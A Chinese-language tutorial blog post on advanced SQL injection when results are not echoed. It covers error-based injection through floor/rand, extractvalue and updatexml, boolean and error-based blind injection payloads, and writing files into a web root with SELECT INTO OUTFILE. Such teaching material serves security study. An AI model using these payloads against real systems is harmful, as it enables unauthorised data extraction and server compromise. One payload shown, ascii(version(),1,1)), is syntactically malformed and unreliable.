---
title: "SQL注入（二）SQL注入进阶-报错注入、盲注"
date: "2021-02-05T13:28:09+08:00"
description: "select xxx into outfile ‘文件路径’，放在web服务器下，可以通过web访问。"
categories: ["信息安全","渗透测试"]
tags: ["渗透测试", "Web安全", "SQL注入"]
topic: security
subtopic: web-security
qualityScore: 84
featured: false
level: intermediate
status: evergreen
legacyPath: "/posts/d35cebb1.html"
---
<p>上一篇是SQL语句执行结果有回显的情况，本篇为无回显的情况下的一些利用技巧。</p>

<p>在SQL语句执行结果不回显的情况下，有三种情况：</p>
<ol>
<li><p>数据库会回显详细报错信息，使用报错注入。</p>
</li>
<li><p>数据库只回显通用报错信息，使用基于数据库错误的盲注。</p>
</li>
<li><p>数据库不回显任何信息，使用基于时间的盲注。</p>
</li>
</ol>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul>
<li>如果数据库报错会回显到前端，可以通过触发报错来获取到需要的数据。</li>
</ul>
<h5 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h5><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql&gt; select count(*),concat(floor(rand()*2),':',database()) as a from information_schema.tables group by a;<br>ERROR 1062 (23000): Duplicate entry '0:security' for key '&lt;group_key&gt;'<br></code></pre></td></tr></table></figure>

<ul>
<li>50%的触发概率</li>
</ul>
<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql&gt; select extractvalue('a',concat('~',database()));<br>ERROR 1105 (HY000): XPATH syntax error: '~security'<br></code></pre></td></tr></table></figure>

<ul>
<li>extractvalue()查询得到字符串的最大长度为32，如果长度超过32，用substring()函数截取。</li>
</ul>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><ul>
<li>与extractvalue类似 </li>
</ul>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于逻辑真假不同结果来获取信息"><a href="#基于逻辑真假不同结果来获取信息" class="headerlink" title="基于逻辑真假不同结果来获取信息"></a>基于逻辑真假不同结果来获取信息</h5><ul>
<li>1‘ and 1=1 – </li>
<li>1’ and 1=2 – </li>
<li>1’ and ORD(MID(VERSION(),2,1))&amp;32&gt;0<ul>
<li>VERSION的第二位的ASCII码的二进制第3位&gt;0</li>
<li>ORD()函数返回字符串第一个字符的ASCII值</li>
<li>MID函数类似于mssql和oracle中的substr</li>
</ul>
</li>
<li>1‘ and ascii(version(),1,1))=65 –<ul>
<li>VERSION的第一位的ascii码为65</li>
</ul>
</li>
<li>current_user()、database()</li>
</ul>
<h5 id="基于数据库错误获取信息"><a href="#基于数据库错误获取信息" class="headerlink" title="基于数据库错误获取信息"></a>基于数据库错误获取信息</h5><ul>
<li>select 1/0 from dual where(select username from all_users where username=’dbsnmp’)=’dbsnmp’<ul>
<li>如果用户dbsnmp存在，则会计算1/0，数据库会发生错误</li>
</ul>
</li>
<li>select 1 where &lt;&lt;condition&gt;&gt; or 1/0 =0</li>
<li>select ename,job form emp where deptno=? order by? desc<ul>
<li>select ename,job from emp where deptno=? order by (select 1/0 from dual where (select substr(max(object_name),1,1) from user_objects)=’Y’) desc</li>
</ul>
</li>
</ul>
<h5 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h5><ul>
<li><p>如果不回显报错，也不回显数据，但知道页面的绝对路径，可以使用。</p>
</li>
<li><p>！注意</p>
<ul>
<li>需要数据库的用户具有选定目录的写入权限</li>
<li>mysql配置文件my.ini中加入一行<code>secure-file-priv=&quot;&quot;</code><ul>
<li>用来限制load data,select … into outfile, load_file()穿到哪个指定目录。</li>
<li>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
</ul>
</li>
</ul>
</li>
<li><p>select xxx into outfile ‘文件路径’，放在web服务器下，可以通过web访问。</p>
</li>
</ul>
